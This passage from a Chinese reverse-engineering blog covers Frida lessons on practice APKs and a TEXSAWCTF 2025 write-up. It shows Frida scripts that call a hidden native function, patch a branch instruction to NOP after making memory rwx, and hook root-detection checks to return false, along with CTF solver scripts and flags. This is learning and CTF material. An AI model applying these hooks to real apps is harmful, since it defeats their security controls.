activityMainBinding.sampleText.setText(stringFromJNI());    &#125;    /* compiled from: MainActivity.kt */    @Metadata(d1 = &#123;&quot;\u0000\f\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002¨\u0006\u0003&quot;&#125;, d2 = &#123;&quot;Lcom/ad2001/frida0xa/MainActivity$Companion;&quot;, &quot;&quot;, &quot;()V&quot;, &quot;app_debug&quot;&#125;, k = 1, mv = &#123;1, 8, 0&#125;, xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)    /* loaded from: classes4.dex */    public static final class Companion &#123;        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) &#123;            this();        &#125;        private Companion() &#123;        &#125;    &#125;    static &#123;        System.loadLibrary(&quot;frida0xa&quot;);    &#125;&#125;</code></pre><p>可以看到应用程序的 MainActivity类中，同样声明了一段native功能：在程序开始时定义了返回值为字符串类型的 native 函数 stringFromJNI，它不接受任何参数；在程序结尾处加载 frida0xa 动态链接库，用于实现 native 函数。MainActivity 类中还定义了onCreate方法，在程序加载时调用 stringFromJNI 函数，将函数返回的 “Hello Hackers”文本设置给 TextView 控件。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/73d70a10-c104-4c25-9830-2c19cf698775.png" alt="73d70a10-c104-4c25-9830-2c19cf698775"></p><p>3.接下来，我们使用 IDA 对 frida0xa 动态链接库进行分析。</p><p>还是一样，先改后缀名，然后找到libfrida0xa.so，用ida64打开，发现函数窗口处一堆函数，并且是用c++写的，直接利用搜索功能找到stringFromJNI函数，可以看到</p><pre><code class="language-c++">__int64 __fastcall Java_com_ad2001_frida0xa_MainActivity_stringFromJNI(_JNIEnv *a1)&#123;  const char *v1; // rsi  __int64 v3; // [rsp+18h] [rbp-48h]  char v4[24]; // [rsp+40h] [rbp-20h] BYREF  unsigned __int64 v5; // [rsp+58h] [rbp-8h]  v5 = __readfsqword(0x28u);  std::string::basic_string&lt;decltype(nullptr)&gt;(v4, &quot;Hello Hackers&quot;);  v1 = (const char *)sub_20690(v4);  v3 = _JNIEnv::NewStringUTF(a1, v1);  std::string::~string(v4);  return v3;&#125;</code></pre><p>同时，我们还发现了一个函数，get_flag函数，这个函数我们在Java层并没有看到有引用，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/a8f42294-b874-4ff2-b4a3-f6fac741ac4b.png" alt="a8f42294-b874-4ff2-b4a3-f6fac741ac4b"></p><p>逻辑很简单，可以直接逆，也可以用Frida框架进行调用，然后程序自解密flag并输出</p><p>要使用 Frida 脚本调用 native 函数，我们需要创建一个 NativePointer 对象，将要调用的 native 函数地址传递给 NativePointer 构造函数。然后，我们需要创建一个 NativeFunction 对象，来表示我们要调用的实际 native 函数。NativeFunction 对象的第一个参数应是 NativePointer 对象，第二个参数是 native 函数的返回类型，第三个参数是要传递给 native 函数参数的数据类型列表。</p><blockquote><p>NativePointer：是 Frida 中一个表示 native 内存地址的 JavaScript 对象，它用于在 Frida 脚本中操作和访问 native 内存地址，比如读取或写入内存中的数据，调用内存中的函数等。</p><p>NativeFunction：是 Frida 中用于在 JavaScript 中调用 native 函数的对象。通过 NativeFunction 对象，可以在 Frida 脚本中调用 native 共享库（如动态链接库）中的函数，实现对 native 函数的调用和控制。</p></blockquote><p>下面就是脚本，具体get_flag函数的地址怎么获取之前有记录</p><pre><code class="language-js">function hook_function() &#123;  var get_flagAddr = Module.findBaseAddress(&quot;libfrida0xa.so&quot;).add(0x1dd60);  var get_flagPtr = new NativePointer(get_flagAddr);  console.log(&quot;find the func&quot;);  var get_flag = new NativeFunction(get_flagPtr, &quot;int&quot;, [&quot;int&quot;, &quot;int&quot;]);  var res = get_flag(1, 2);  console.log(res);&#125;setImmediate(function () &#123;//   Java.perform(function () &#123;    hook_function();//   &#125;);&#125;, 1000);</code></pre><p>运行脚本。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250725163325106.png" alt="image-20250725163325106"></p><p>可以看到get_flag函数成功被调用并且返回了1，也就是说在日志中成功输出了，打开Android studio看日志，就可以找到flag<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250725163428497.png" alt="image-20250725163428497"></p><p><strong>总结</strong>：Frida 调用 native 函数脚本模板</p><pre><code class="language-js">var native_adr = new NativePointer(&lt;address_of_the_native_function&gt;);// 创建一个 NativePointer 对象，用于操作和访问 &lt;address_of_the_native_function&gt;内存地址。const native_function = new NativeFunction(native_adr, &#39;&lt;return type&gt;&#39;, [&#39;argument_data_type&#39;]);// 创建一个 NativeFunction 对象，实现对 native 函数的调用和控制。// native_adr：使用native_adr NativePointer对象；// &#39;&lt;return type&gt;&#39;：函数的返回值类型；// [&#39;argument_data_type&#39;]：传递给函数的参数类型列表。native_function(&lt;arguments&gt;);// 调用 native_function 函数，如果需要，可以传递&lt;arguments&gt;参数。</code></pre><hr><h5 id="十三-Frida用法（11）-js脚本-使用ARM64Writer修改指令"><a href="#十三-Frida用法（11）-js脚本-使用ARM64Writer修改指令" class="headerlink" title="十三.Frida用法（11） .js脚本 使用ARM64Writer修改指令"></a>十三.Frida用法（11） .js脚本 使用ARM64Writer修改指令</h5><p>1.这个题和上一个题一样，还是在雷电模拟器上安装不了，然后在夜神模拟器上运行不了，很苦恼，那就只能学思维和操作方法了。(时隔一年，回来继续写，hhhh)</p><p>2.用jadx反编译看看函数逻辑</p><pre><code class="language-java">package com.ad2001.frida0xb;import android.os.Bundle;import android.view.View;import android.widget.Button;import androidx.appcompat.app.AppCompatActivity;import androidx.constraintlayout.widget.ConstraintLayout;import com.ad2001.frida0xb.databinding.ActivityMainBinding;import kotlin.Metadata;import kotlin.jvm.internal.DefaultConstructorMarker;import kotlin.jvm.internal.Intrinsics;/* compiled from: MainActivity.kt */@Metadata(d1 = &#123;&quot;\u0000\&quot;\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\u0018\u0000 \n2\u00020\u0001:\u0001\nB\u0005¢\u0006\u0002\u0010\u0002J\t\u0010\u0005\u001a\u00020\u0006H\u0086 J\u0012\u0010\u0007\u001a\u00020\u00062\b\u0010\b\u001a\u0004\u0018\u00010\tH\u0014R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000¨\u0006\u000b&quot;&#125;, d2 = &#123;&quot;Lcom/ad2001/frida0xb/MainActivity;&quot;, &quot;Landroidx/appcompat/app/AppCompatActivity;&quot;, &quot;()V&quot;, &quot;binding&quot;, &quot;Lcom/ad2001/frida0xb/databinding/ActivityMainBinding;&quot;, &quot;getFlag&quot;, &quot;&quot;, &quot;onCreate&quot;, &quot;savedInstanceState&quot;, &quot;Landroid/os/Bundle;&quot;, &quot;Companion&quot;, &quot;app_debug&quot;&#125;, k = 1, mv = &#123;1, 8, 0&#125;, xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)/* loaded from: classes3.dex */public final class MainActivity extends AppCompatActivity &#123;    public static final Companion Companion = new Companion(null);    private ActivityMainBinding binding;    public final native void getFlag();    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    public void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());        Intrinsics.checkNotNullExpressionValue(inflate, &quot;inflate(layoutInflater)&quot;);        this.binding = inflate;        if (inflate == null) &#123;            Intrinsics.throwUninitializedPropertyAccessException(&quot;binding&quot;);            inflate = null;        &#125;        setContentView(inflate.getRoot());        View findViewById = findViewById(R.id.button);        Intrinsics.checkNotNullExpressionValue(findViewById, &quot;findViewById(R.id.button)&quot;);        Button btn = (Button) findViewById;        btn.setOnClickListener(new View.OnClickListener() &#123; // from class: com.ad2001.frida0xb.MainActivity$$ExternalSyntheticLambda0            @Override // android.view.View.OnClickListener            public final void onClick(View view) &#123;                MainActivity.onCreate$lambda$0(MainActivity.this, view);            &#125;        &#125;);    &#125;    /* JADX INFO: Access modifiers changed from: private */    public static final void onCreate$lambda$0(MainActivity this$0, View it) &#123;        Intrinsics.checkNotNullParameter(this$0, &quot;this$0&quot;);        this$0.getFlag();    &#125;    /* compiled from: MainActivity.kt */    @Metadata(d1 = &#123;&quot;\u0000\f\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002¨\u0006\u0003&quot;&#125;, d2 = &#123;&quot;Lcom/ad2001/frida0xb/MainActivity$Companion;&quot;, &quot;&quot;, &quot;()V&quot;, &quot;app_debug&quot;&#125;, k = 1, mv = &#123;1, 8, 0&#125;, xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)    /* loaded from: classes3.dex */    public static final class Companion &#123;        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) &#123;            this();        &#125;        private Companion() &#123;        &#125;    &#125;    static &#123;        System.loadLibrary(&quot;frida0xb&quot;);    &#125;&#125;</code></pre><p>可以看到在应用程序的 MainActivity 类中，定义了一个 native 函数 getFlag，该函数不接受任何参数也没有返回值，并在程序结尾处使用 System.loadLibrary 函数加载 frida0xb 动态链接库。MainActivity 类中定义的 onCreate 方法监听按钮的点击，点击按钮时会通过 lambda 表达式调用 onCreate$lambda$0 方法，然后在onCreate$lambda$0 方法中调用 getFlag 函数。接下来，我们使用 IDA 对 frida0xb 动态链接库进行分析，查看 getFlag 函数是如何实现的。</p><p>获取.so文件的方法还是一样，改一下后缀名，然后找到对应的.so文件，用ida64打开，找到函数，发现ida反编译出来的伪代码严重不完整</p><p>这是反编译的<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/c1c99ce8-dd3c-45e7-972d-420bc723bb6b.png" alt="c1c99ce8-dd3c-45e7-972d-420bc723bb6b"></p><p>这是汇编</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/b7f9b83b-82c3-4020-8214-7e21221cd822.png" alt="b7f9b83b-82c3-4020-8214-7e21221cd822"></p><p>我们回到流程控制窗口中查看。可以看到程序中出现永远为假的条件跳转，导致 IDA 识别不到解密 flag 并输出的代码指令<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/c8c51492-2225-42d3-a08c-fb511b6314c6.png" alt="c8c51492-2225-42d3-a08c-fb511b6314c6"></p><p>然后一跳转就没了。</p><p>分析完代码我们可以发现，程序在点击按钮时调用了 getFlag 函数，该函数在 native 代码实现过程中，有一个永久为假的条件跳转，导致解密 flag 并输出的代码块未被执行。为了获取这个 flag ，我们需要使用 Frida 脚本，修改jnz（跳转到程序结尾）这条指令，让它不执行，以绕过条件跳转来执行解码和输出 flag 的程序。</p><p>我们需要使用Frida 框架，编写一个 JavaScript 脚本，将 native 函数 getFlag 中的 B.NE （条件分支跳转指令）修改为 Nop（空操作指令），在Frida中修改汇编指令需要使用ARM64Writer 类。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/fbfa387f-184f-4213-8b0b-f0095d0bf4c3.png" alt="fbfa387f-184f-4213-8b0b-f0095d0bf4c3"></p><p>首先，我们需要知道 B.NE 指令的地址，该地址同样可以通过Module.getBaseAddress API 得到 frida0xb 库的基地址，再加上 B.NE 指令的偏移量来获取。我们可以在IDA中查看 B.NE 指令地址的偏移量为”0x170CE″。然后创建一个 ARM64Writer 类的实例，将获取到的 B.NE 指令的地址作为传入参数，再调用 ARM64Writer 实例的 putNop 方法在 B.NE 指令的地址上写入一条 Nop 指令，覆盖掉原来的指令。接着调用 ARM64Writer 实例的 flush 方法将修改后的指令写入内存中。<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/14ee1b95-145b-4648-b0b9-c6ed99e9f2ec.png" alt="14ee1b95-145b-4648-b0b9-c6ed99e9f2ec"></p><p>为了绕过应用程序中的内存分页保护机制，成功修改并运行 native 代码中的指令，我们还需要使用 Frida 中的 Memory.protect 函数，将指定内存区域的保护属性修改为”rwx”（可读可写可执行）。</p><blockquote><p>在Frida中，Memory.protect 函数用于修改内存页的保护属性，以控制对内存的访问权限。这个函数可以用来修改目标进程中的内存页，例如将内存页设置为可读、可写、可执行等。Memory.protect 函数的语法如下：  </p><p>   Memory.protect(ptr, size, protection)</p><ul><li><p>ptr: 表示要修改保护属性的内存地址，通常是一个指向目标内存区域的指针。</p></li><li><p>size: 表示要修改保护属性的内存区域的大小，以字节为单位。</p></li><li><p>protection: 表示要设置的内存保护属性。</p></li></ul></blockquote><p>脚本如下</p><pre><code class="language-js">var jnz_adr =  Module.getBaseAddress(&quot;libfrida0xb.so&quot;).add(0x170CE);//获取 jnz 指令地址。Memory.protect(jnz_adr,0x1000,&quot;rwx&quot;);// 将对应内存区域的保护属性修改为可读可写可执行。var writer = new Arm64Writer(jnz_adr);// 创建 ARM64Writer 类的实例 writer，将 jnz_adr 作为写入的内存地址。try&#123;  writer.putNop();  // 在原本 jnz 指令的地址上写入一条 Nop 指令，替换原本的 jnz 指令  writer.flush();  // 将修改后的指令写入内存中  console.log(&quot;Command modification successful.&quot;);  // 指令修改完成后打印一条提示语。&#125;finally &#123;  writer.dispose();  // 释放与 writer 实例关联的资源。&#125;</code></pre><p>脚本还是上面的脚本，运行一下就行了；但是这题应该还可以直接该指令，然后重新打包一下解决的</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250725165131171.png" alt="image-20250725165131171"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250725165616883.png" alt="image-20250725165616883"></p><p>完了patch一下，接着用mt管理器重新签名打包一下</p><p>然后安装直接运行，就可以在Android studio中找</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250725165813894.png" alt="image-20250725165813894"></p><p><strong>总结</strong>：Frida使用ARM64Writer修改指令的脚本模板</p><pre><code class="language-js">var writer = new ARM64Writer(&lt;address_of_the_instruction&gt;);// 创建一个Arm64Writer类实例，用于编写ARM64指令，codeAddress是要写入的内存地址。try &#123;  /*  我们自己的指令实现  */  writer.flush();  // 将修改后的指令写入内存中&#125; finally &#123;  writer.dispose();  // 释放与 ARM64Writer 实例关联的资源。&#125;</code></pre><h5 id="十四-Android-JAVA层root检测绕过"><a href="#十四-Android-JAVA层root检测绕过" class="headerlink" title="十四.Android JAVA层root检测绕过"></a>十四.Android JAVA层root检测绕过</h5><p>当看到类似代码检测</p><pre><code class="language-java">    protected void onCreate(Bundle bundle) &#123;        if (c.a() || c.b() || c.c()) &#123;            a(&quot;Root detected!&quot;);        &#125;        if (b.a(getApplicationContext())) &#123;            a(&quot;App is debuggable!&quot;);        &#125;        super.onCreate(bundle);        setContentView(R.layout.activity_main);    &#125;</code></pre><pre><code class="language-java">package sg.vantagepoint.a;import android.os.Build;import java.io.File;/* loaded from: classes.dex */public class c &#123;    public static boolean a() &#123;        for (String str : System.getenv(&quot;PATH&quot;).split(&quot;:&quot;)) &#123;            if (new File(str, &quot;su&quot;).exists()) &#123;                return true;            &#125;        &#125;        return false;    &#125;    public static boolean b() &#123;        String str = Build.TAGS;        return str != null &amp;&amp; str.contains(&quot;test-keys&quot;);    &#125;    public static boolean c() &#123;        for (String str : new String[]&#123;&quot;/system/app/Superuser.apk&quot;, &quot;/system/xbin/daemonsu&quot;, &quot;/system/etc/init.d/99SuperSUDaemon&quot;, &quot;/system/bin/.ext/.su&quot;, &quot;/system/etc/.has_su_daemon&quot;, &quot;/system/etc/.installed_su_daemon&quot;, &quot;/dev/com.koushikdutta.superuser.daemon/&quot;&#125;) &#123;            if (new File(str).exists()) &#123;                return true;            &#125;        &#125;        return false;    &#125;&#125;</code></pre><p>那么我们可以写frida-hook脚本，使得其检测函数返回false，就可以正常在模拟器上运行。</p><pre><code class="language-java">setImmediate(function () &#123;    console.log(&quot;[*] Starting script&quot;);    Java.perform(function () &#123;        let c = Java.use(&quot;sg.vantagepoint.a.c&quot;);        c[&quot;a&quot;].implementation = function () &#123;            return false;        &#125;;        c[&quot;b&quot;].implementation = function () &#123;            return false;        &#125;;        c[&quot;c&quot;].implementation = function () &#123;            return false;        &#125;;    &#125;);&#125;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Frida入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TEXSAWCTF 2025</title>
      <link href="/2025/04/12/TEXSAWCTF%202025/"/>
      <url>/2025/04/12/TEXSAWCTF%202025/</url>
      
        <content type="html"><![CDATA[<h1 id="TEXSAWCTF-2025"><a href="#TEXSAWCTF-2025" class="headerlink" title="TEXSAWCTF 2025"></a>TEXSAWCTF 2025</h1><h3 id="xorer"><a href="#xorer" class="headerlink" title="xorer"></a>xorer</h3><p>ida打开看到就是一个xor</p><pre><code class="language-c">void __cdecl check_password(char *input)&#123;  int v1; // eax  unsigned __int8 key[12]; // [esp+Ch] [ebp-1Ch] BYREF  int len; // [esp+18h] [ebp-10h]  int i; // [esp+1Ch] [ebp-Ch]  qmemcpy(key, &quot;藭漾淹桗蒙懧&quot;, 6);  len = strlen(input);  for ( i = 0; i &lt;= 7; ++i )  &#123;    v1 = input[i];    LOBYTE(v1) = v1 ^ 0xA5;    if ( v1 != key[i] )    &#123;      puts(&quot;Wrong password!&quot;);      return;    &#125;  &#125;  printf(&quot;Correct! Here&#39;s your flag: texsaw&#123;%s&#125;\n&quot;, input);&#125;</code></pre><p>数据提取出来直接异或</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250412150619974.png" alt="image-20250412150619974"></p><p><strong>texsaw{n0t_th3_fl4g}</strong></p><hr><h3 id="Too-Early-4-Me"><a href="#Too-Early-4-Me" class="headerlink" title="Too Early 4 Me"></a>Too Early 4 Me</h3><p>ida打开分析，直接有decode的逻辑，改一下EIP，改到decode函数的地址，直接程序自己输出了</p><pre><code>unsigned __int64 decode_flag()&#123;  int i; // [rsp+8h] [rbp-118h]  unsigned int j; // [rsp+Ch] [rbp-114h]  char v3[264]; // [rsp+10h] [rbp-110h]  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 255; ++i )    v3[sbox[i]] = i;  printf(&quot;Decoded flag: &quot;);  for ( j = 0; j &lt;= 33; ++j )    putchar(v3[encoded_flag[j]]);  putchar(10);  return v4 - __readfsqword(0x28u);&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250412153213185.png" alt="image-20250412153213185"></p><p><strong>texsaw{how_signalicious_much_swag}</strong></p><hr><h3 id="ez-rev"><a href="#ez-rev" class="headerlink" title="ez rev"></a>ez rev</h3><p>一道<strong>OCaml</strong>逆向。</p><p>ida打开分析，进入main函数，看到</p><pre><code class="language-c">int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  caml_main((char_os **)argv);  caml_do_exit(0);&#125;</code></pre><p>直接跟进<strong>caml_main</strong>函数，然后再跟进<strong>caml_startup_common</strong>函数</p><p>这是OCaml运行时系统的启动函数，负责初始化OCaml虚拟机环境，调用初始化OCaml域，解析运行时参数等等。</p><p>调用<strong>caml_start_program</strong>启动OCaml主程序</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413133645476.png" alt="image-20250413133645476"></p><p>跟进</p><pre><code class="language-c">__int64 __fastcall caml_start_program(_QWORD *a1)&#123;  __int64 v1; // r15  __int64 result; // rax  _QWORD v3[2]; // [rsp-28h] [rbp-68h] BYREF  __int64 v4; // [rsp-18h] [rbp-58h]  __int64 v5; // [rsp-10h] [rbp-50h]  __int64 v6; // [rsp-8h] [rbp-48h]  v6 = a1[28];  v5 = a1[27];  v4 = a1[26];  v1 = a1[1];  v3[1] = sub_846FF;  v3[0] = a1[2];  a1[2] = v3;  result = caml_startup__code_begin();  a1[2] = v3[0];  a1[1] = v1;  a1[26] = v4;  a1[27] = v5;  a1[28] = v6;  return result;&#125;</code></pre><p>这是OCaml运行时系统中启动OCaml主程序的函数，它负责设置执行环境并跳转到OCaml代码的入口点。</p><p>跟进<strong>caml_startup__code_begin</strong>函数</p><pre><code class="language-c">__int64 caml_startup__code_begin()&#123;  camlCamlinternalFormatBasics__entry();  ++caml_globals_inited;  camlCamlinternalAtomic__entry();  ++caml_globals_inited;  camlStdlib__entry();  ++caml_globals_inited;  camlStdlib__Sys__entry();  ++caml_globals_inited;  camlStdlib__Obj__entry();  ++caml_globals_inited;  camlCamlinternalLazy__entry();  ++caml_globals_inited;  camlStdlib__Lazy__entry();  ++caml_globals_inited;  camlStdlib__Seq__entry();  ++caml_globals_inited;  camlStdlib__Char__entry();  ++caml_globals_inited;  camlStdlib__Uchar__entry();  ++caml_globals_inited;  camlStdlib__List__entry();  ++caml_globals_inited;  camlStdlib__Int__entry();  ++caml_globals_inited;  camlStdlib__Bytes__entry();  ++caml_globals_inited;  camlStdlib__String__entry();  ++caml_globals_inited;  camlStdlib__Buffer__entry();  ++caml_globals_inited;  camlCamlinternalFormat__entry();  ++caml_globals_inited;  camlStdlib__Printf__entry();  ++caml_globals_inited;  camlEasy_rev__entry();  ++caml_globals_inited;  camlStd_exit__entry();  ++caml_globals_inited;  return 1LL;&#125;</code></pre><p>这是OCaml程序启动时的初始化函数，负责初始化OCaml标准库和用户模块的入口点。</p><p>**camlEasy_rev__entry()**模块应该就是出题人自定义的模块</p><pre><code class="language-c">void __cdecl camlEasy_rev__entry()&#123;  __int64 v0; // rax  __int64 v1; // rax  __int64 v2; // rax  void (**v3)(void); // rax  camlEasy_rev[0] = &amp;camlEasy_rev__10;  camlEasy_rev[1] = &amp;camlEasy_rev__20;  camlEasy_rev[2] = &amp;camlEasy_rev__30;  camlStdlib___40_198();  camlStdlib___40_198();  camlEasy_rev[3] = v0;  camlEasy_rev[4] = &amp;camlEasy_rev__38;  camlStdlib__List__map_482();  camlEasy_rev[5] = v1;  camlStdlib__List__fold_left_521();  camlEasy_rev[6] = v2;  camlStdlib__Printf__fprintf_422();  (*v3)();&#125;</code></pre><p>**camlStdlib___40_198()<strong>的作用是构造链表。然后呢，这里的</strong>camlStdlibListfold_left_521()**函数需要修改一下函数声明，然后F5重新反编译一下，</p><pre><code class="language-c">void __cdecl camlEasy_rev__entry()&#123;  __int64 v0; // rsi  __int64 v1; // rax  __int64 v2; // rax  __int64 v3; // rdx  __int64 v4; // rax  void (**v5)(void); // rax  camlEasy_rev[0] = &amp;camlEasy_rev__10;  camlEasy_rev[1] = &amp;camlEasy_rev__20;  camlEasy_rev[2] = &amp;camlEasy_rev__30;  camlStdlib___40_198();  camlStdlib___40_198();  camlEasy_rev[3] = v1;  camlEasy_rev[4] = &amp;camlEasy_rev__38;  camlStdlib__List__map_482();  camlEasy_rev[5] = v2;  camlStdlib__List__fold_left_521(camlEasy_rev[5], v0, v3);  camlEasy_rev[6] = v4;  camlStdlib__Printf__fprintf_422();  (*v5)();&#125;</code></pre><p>然后动调，<strong>camlStdlibListfold_left_521</strong>函数的<strong>第二个参数</strong>才是本来的操作</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413140056026.png" alt="image-20250413140056026"></p><p>这段应该是实现除法的功能。然后**camlStdlibPrintffprintf_422()**函数就会输出</p><p><strong>sum of all flag elements: 2836</strong>。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413141839118.png" alt="image-20250413141839118"></p><p>这些就是对应数据，写个脚本扣出来</p><pre><code class="language-python">import idautilsimport idcimport idaapidef get_first_qword(addr):    &quot;&quot;&quot;读取地址处的第一个 QWORD 值&quot;&quot;&quot;    return idc.get_qword(addr)def main():    print(&quot;[*] Extracting camlEasy_rev__1 to camlEasy_rev__30 values...&quot;)    results = []    # 遍历符号 camlEasy_rev__1 到 camlEasy_rev__30    for i in range(1, 31):  # 1~30        symbol_name = f&quot;camlEasy_rev__&#123;i&#125;&quot;        symbol_addr = idc.get_name_ea_simple(symbol_name)        # 验证符号是否存在        if symbol_addr == idaapi.BADADDR:            print(f&quot;[!] Symbol &#123;symbol_name&#125; not found!&quot;)            continue        # 读取第一个 QWORD 值（假设链表节点结构为 [QWORD data, QWORD next]）        first_qword = get_first_qword(symbol_addr)        results.append((symbol_name, first_qword))    # 输出结果    for name, value in results:        print(f&quot;&#123;name&#125;: 0x&#123;value:X&#125;&quot;)if __name__ == &quot;__main__&quot;:    main()</code></pre><p>拿到数据，可以开始写爆破脚本了，因为具体不知道出几，然后flag字符的和就是运行程序输出的那个值，2836。但是还有一个问题，就是flag字符的顺序。</p><p>分析链表构造函数逻辑可知，采用的是递归反向构造技术，并且将flag平均分成三部分，也可以从节点的指针进行分析</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413161953916.png" alt="image-20250413161953916"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413162014730.png" alt="image-20250413162014730"></p><p>这是一个完整的节点，前半部分是本节点的值，后半部分是指向的下一个节点。如上图就是第十个节点的值是0x289，指向的下一个节点就是第九个节点。</p><p>然后我们按顺序处理好数据，然后写个脚本进行求解</p><pre><code class="language-python">enc = [ 0x2B9, 0x25F, 0x2D1, 0x2B3, 0x247, 0x2CB, 0x2E3, 0x247, 0x23B, 0x24D,        0x127, 0x2B9, 0x23B, 0x121, 0x265, 0x23B, 0x121, 0x253, 0x139, 0x28F,        0x289, 0x23B, 0x2AD, 0x133, 0x2C5, 0x133, 0x2AD, 0x2B3, 0x133, 0x2EF,]for num in range(1, 100):    sum = 0    for i in enc:        sum += i // num    if sum == 2836:        print(&quot;flag: &quot;, end=&quot;&quot;)        for j in enc:            print(chr(j // num), end=&quot;&quot;)        print()        print(f&quot;divisor: &#123;num&#125;&quot;)</code></pre><p>flag: <strong>texsaw{a_b1t_0f_0c4ml_r3v3rs3}</strong><br>divisor: <strong>6</strong></p><hr><h3 id="Babies-first-ez-Python4"><a href="#Babies-first-ez-Python4" class="headerlink" title="Babies first ez Python4"></a>Babies first ez Python4</h3><p>下载下来附件是个.txt，打开来看到内容是混淆严重的python字节码</p><p>可以先写个脚本进行去除一下</p><pre><code class="language-python">import re# 读取文件内容with open(&quot;chal.txt&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:    content = f.read()# 匹配由 a 和 b 组成的、长度不少于 20 的连续串pattern = r&quot;(?:[ab]&#123;20,&#125;)&quot;# 找到所有匹配项matches = re.findall(pattern, content)# 用于记录已经替换过的串，防止重复编号seen = &#123;&#125;counter = 1# 替换函数def replacer(match):    global counter    m = match.group(0)    if m not in seen:        label = f&quot;obf_&#123;counter:03d&#125;&quot;        seen[m] = label        counter += 1    return seen[m]# 进行替换new_content = re.sub(pattern, replacer, content)# 将处理后的内容写入新文件with open(&quot;cleaned_chal.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:    f.write(new_content)</code></pre><p>然后代码前半部分，应该是常量的申明</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413174400116.png" alt="image-20250413174400116"></p><p>然后这部分应该是类似于函数头和函数结尾？</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413174527521.png" alt="image-20250413174527521"></p><p>再往下就是每个常量，或者说字符的由来</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413174605442.png" alt="image-20250413174605442"></p><p>就是根据字符 ‘_’的长度，减27，然后转成字符，这里可以写哥脚本提出来</p><pre><code class="language-python">import redef extract_from_disassembly(file_path, output_path):    with open(file_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:        content = f.read()    # 匹配每段函数体：Disassembly of &lt;code object obf_XXX ...&gt; 到下一个 Disassembly 或文件末尾    pattern = r&#39;Disassembly of &lt;code object (obf_\d&#123;3&#125;)[^&gt;]*&gt;:\n(.*?)(?=Disassembly of &lt;code object|$)&#39;    matches = re.findall(pattern, content, re.DOTALL)    results = []    for func_name, block_text in matches:        # 找到连续 30 个以上下划线        underscores = re.findall(r&#39;_&#123;30,&#125;&#39;, block_text)        for us in underscores:            code = len(us) - 27            char = chr(code) if 0 &lt;= code &lt;= 127 else &#39;?&#39;            results.append(f&quot;&#123;func_name&#125;: &#123;char&#125;&quot;)    # 保存到文件    with open(output_path, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:        f.write(&#39;\n&#39;.join(results))    print(f&quot;✅ 已保存输出到: &#123;output_path&#125;&quot;)    print(f&quot;共提取 &#123;len(results)&#125; 个字符。&quot;)# 使用if __name__ == &quot;__main__&quot;:    input_file = &quot;cleaned_chal.txt&quot;    output_file = &quot;underscore_ascii.txt&quot;    extract_from_disassembly(input_file, output_file)</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413174736801.png" 